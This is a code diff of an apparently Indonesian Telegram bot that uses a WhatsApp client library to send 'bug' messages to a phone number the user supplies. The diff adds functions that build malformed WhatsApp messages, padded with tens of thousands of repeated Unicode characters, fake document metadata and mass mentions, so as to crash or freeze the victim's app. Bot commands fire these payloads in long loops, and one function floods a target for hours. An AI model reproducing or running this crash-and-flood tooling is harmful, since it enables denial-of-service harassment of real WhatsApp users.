@@ -391,6 +391,177 @@ async function nullQ(target) {
     participant: { jid: target }
   });
 }
+async function spamNotif(target, Ptcp = true) {
+    let virtex = "RANZZ COLDD" + "ꦾ".repeat(90000) + "@8".repeat(90000);
+    await sock.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: "ɪᴅɪᴏᴛs",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: virtex
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+}
+async function ZerosBlankX(target, ptcp = true) {
+  const Vampire = `_*~@8~*_\n`.repeat(10500);
+  const CrashNotif = 'ꦽ'.repeat(55555);
+
+  await sock.relayMessage(
+    target,
+    {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                fileLength: "9999999999999",
+                pageCount: 1316134911,
+                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                fileName: "𝐙𝐞𝐫𝐨𝐬 𝐃𝐢𝐜𝐭𝐢𝐯𝐞",
+                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1726867151",
+                contactVcard: true,
+                jpegThumbnail: null,
+              },
+              hasMediaAttachment: true,
+            },
+            body: {
+              text: 'RANZZZ WANGSHAPP' + CrashNotif + Vampire,
+            },
+            footer: {
+              text: '',
+            },
+            contextInfo: {
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from(
+                  { length: 30000 },
+                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                ),
+              ],
+              forwardingScore: 1,
+              isForwarded: true,
+              fromMe: false,
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              quotedMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                  fileLength: "9999999999999",
+                  pageCount: 1316134911,
+                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                  fileName: "𝐓𝐡𝐞 𝐙𝐞𝐫𝐨𝐬",
+                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1724474503",
+                  contactVcard: true,
+                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                  jpegThumbnail: "",
+                },
+              },
+            },
+          },
+        },
+      },
+    },
+    ptcp
+      ? {
+          participant: {
+            jid: target,
+          },
+        }
+      : {}
+  );
+}
+async function zerosUi(target, Ptcp = true) {
+  try {
+    await sock.relayMessage(
+      target,
+      {
+        ephemeralMessage: {
+          message: {
+            interactiveMessage: {
+              header: {
+                locationMessage: {
+                  degreesLatitude: 0,
+                  degreesLongitude: 0,
+                },
+                hasMediaAttachment: true,
+              },
+              body: {
+                text:
+                  "RAAANZ̤\n" +
+                  "ꦾ".repeat(92000) +
+                  "ꦽ".repeat(92000) +
+                  `@1`.repeat(92000),
+              },
+              nativeFlowMessage: {},
+              contextInfo: {
+                mentionedJid: [
+                  "1@newsletter",
+                  "1@newsletter",
+                  "1@newsletter",
+                  "1@newsletter",
+                  "1@newsletter",
+                ],
+                groupMentions: [
+                  {
+                    groupJid: "1@newsletter",
+                    groupSubject: "zeros",
+                  },
+                ],
+                quotedMessage: {
+                  documentMessage: {
+                    contactVcard: true,
+                  },
+                },
+              },
+            },
+          },
+        },
+      },
+      {
+        participant: { jid: target },
+        userJid: target,
+      }
+    );
+  } catch (err) {
+    console.log(err);
+  }
+}
 async function VampireGroupInvis(target, ptcp = true) {
     try {
         const message = {
@@ -460,7 +631,7 @@ async function FlowX(target) {
               hasMediaAttachment: false,
             },
             body: {
-              text: "puki",
+              text: " ㅤ ㅤ ㅤ ㅤ ㅤ",
             },
             nativeFlowMessage: {
               messageParamsJson: "",
@@ -487,6 +658,125 @@ async function FlowX(target) {
     participant: { jid: target },
   });
 }
+async function ZerosVisible(target, mention) { // Default true biar otomatis nyala
+    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
+        title: "᭡꧈".repeat(95000),
+        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
+    }));
+
+    const MSG = {
+        viewOnceMessage: {
+            message: {
+                listResponseMessage: {
+                    title: "You Loser ×_×",
+                    listType: 2,
+                    buttonText: null,
+                    sections: delaymention,
+                    singleSelectReply: { selectedRowId: "🔴" },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 30000 }, () => 
+                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                        ),
+                        participant: target,
+                        remoteJid: "status@broadcast",
+                        forwardingScore: 9741,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "333333333333@newsletter",
+                            serverMessageId: 1,
+                            newsletterName: "-"
+                        }
+                    },
+                    description: "𝖹𝖾𝗋𝗈𝗌𝗌"
+                }
+            }
+        },
+        contextInfo: {
+            channelMessage: true,
+            statusAttributionType: 2
+        }
+    };
+
+    const msg = generateWAMessageFromContent(target, MSG, {});
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    // **Cek apakah mention true sebelum menjalankan relayMessage**
+    if (mention) {
+        await sock.relayMessage(
+            target,
+            {
+                statusMentionMessage: {
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25
+                        }
+                    }
+                }
+            },
+            {
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: { is_status_mention: "Zeros Are Destroyers" },
+                        content: undefined
+                    }
+                ]
+            }
+        );
+    }
+}
+async function sendMessagesForDurationX(durationHours, target) {
+const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
+const startTime = Date.now();
+let count = 0;
+
+const sendNext = async () => {
+if (Date.now() - startTime >= totalDurationMs) {
+console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
+return;
+}
+
+if (count < 800) {
+await ZerosVisible(target, false); // Menggunakan target dari input pengguna
+count++;
+console.log(chalk.red(`Mengirimkan Paket ${count}/800 ke ${target}`));
+   sendNext(); // Melanjutkan pengiriman
+   console.clear();
+} else {
+console.log(chalk.green(`Selesai Mengirimkan 800 Paket Ke ${target}`)); // Log selesai kirim 800 paket
+count = 0; // Reset untuk paket berikutnya
+console.log(chalk.red("Menyiapkan Untuk Mengirim 800 Paket Berikutnya..."));
+setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
+}
+};
+
+sendNext();
+};
+
 async function VampireNewUi(target, Ptcp = true) {
   try {
     await sock.relayMessage(
@@ -852,20 +1142,7 @@ async function NewpayFc1(target) {
                         { name: "send_location", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                         { name: "payments_care_csat", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                         { name: "view_product", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "payment_settings", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "address_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "open_webview", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "message_with_link_status", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "payment_status", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },                        { name: "galaxy_costum", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "extensions_message_v2", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "landline_call", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "mpm", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "cta_copy", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "cta_url", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "review_and_pay", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "galaxy_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
-                        { name: "cta_call", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) }
+                        { name: "payment_settings", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) }
                     ]
                 }
             }
@@ -873,6 +1150,7 @@ async function NewpayFc1(target) {
         { participant: { jid: target } }
     );
 }
+
 async function VampCrashCH(target) {
   const msg = generateWAMessageFromContent(target, {
     interactiveMessage: {
@@ -1461,30 +1739,22 @@ await VampireBlankIphone(target);
 }
 };
 async function VampOri(target) {
-    for (let i = 0; i <= 100; i++) {
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
-    await VampireBlank(target, Ptcp = true)
+    for (let i = 0; i <= 5; i++) {
+    await ZerosBlankX(target, Ptcp = true)
+    await spamNotif(target, Ptcp = true)
+    await zerosUi(target, Ptcp = true)
+    await spamNotif(target, Ptcp = true)
+    await zerosUi(target, Ptcp = true)
+    await spamNotif(target, Ptcp = true)
+    await zerosUi(target, Ptcp = true)
+    await spamNotif(target, Ptcp = true)
+    await zerosUi(target, Ptcp = true)
+    await ZerosBlankX(target, Ptcp = true)
     }
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 800; i++) {
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
+    for (let i = 0; i <= 5; i++) {
     await VampBroadcast(target, mention = true)
     }
 
@@ -1783,7 +2053,7 @@ bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
   cooldownTime = newCooldown * 60; // Ubah ke detik
   return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
 });
-bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/delaymention(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1794,12 +2064,12 @@ bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /frezechat 62×××.");
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /delaymention 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampori 62×××.");
+        return bot.sendMessage(chatId, "❌ Invalid input. Example: /delaymention 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
@@ -1813,8 +2083,167 @@ bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
-        await NewpayFc1(formatedNumber);
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
     }
 
     // Kirim pesan setelah selesai dengan gambar lain
@@ -1823,12 +2252,12 @@ bot.onText(/\/frezechat(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /frezechat
+┃〢 Cᴏᴍᴍᴀɴᴅ : /delaymention
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/frezyhge(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1844,7 +2273,7 @@ bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 62×××.");
+        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /freze 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
@@ -1857,42 +2286,9 @@ bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
-        await VampBroadcast(formatedNumber);
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await freezechat(formatedNumber);
+        await freezechat(formatedNumber);
     }
 
     await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
@@ -1905,7 +2301,7 @@ bot.onText(/\/supgherdelay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/hardeljjdhday(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/system(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1916,12 +2312,12 @@ bot.onText(/\/hardeljjdhday(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /hardelay 62×××.");
+        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /system 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /hardelay 62×××.");
+        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /system 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
@@ -1937,7 +2333,7 @@ bot.onText(/\/hardeljjdhday(?:\s(.+))?/, async (msg, match) => {
 
     // Proses pengiriman bug
     for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
-        await VampDelayInvis(formatedNumber);
+        await VampOri(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -1946,7 +2342,7 @@ bot.onText(/\/hardeljjdhday(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /hardelay
+┃〢 Cᴏᴍᴍᴀɴᴅ : /system 
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
@@ -1997,7 +2393,7 @@ bot.onText(/\/bakios(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/delaymention(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/delaymenhhshdbbdtion(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -2053,7 +2449,7 @@ bot.onText(/\/forceclose(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Siapa!!! Bukan Premium Mau Access Bot");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /system 62×××.");
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /force x delay 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -2072,7 +2468,144 @@ bot.onText(/\/forceclose(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 100; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await FlowX(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
